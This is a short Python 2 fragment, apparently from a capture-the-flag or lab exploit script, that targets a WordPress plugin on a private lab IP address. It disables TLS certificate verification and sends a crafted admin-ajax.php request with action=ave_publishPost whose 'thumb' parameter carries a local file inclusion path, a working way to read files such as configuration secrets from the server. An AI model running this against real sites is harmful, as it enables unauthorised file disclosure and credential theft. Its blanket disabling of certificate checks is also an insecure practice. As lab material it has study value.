...
import ssl
# add this to avoid custom cert errors
ssl._create_default_https_context = ssl._create_unverified_context


#url = "http://127.0.0.1/wordpress" # insert url to wordpress
url = "https://192.168.56.104:12380/blogblog/"
...
objHtml = urllib2.urlopen(url + '/wp-admin/admin-ajax.php?action=ave_publishPost&title=' + str(randomID) + '&short=rnd&term=rnd&thumb=' + LFI_FILE)
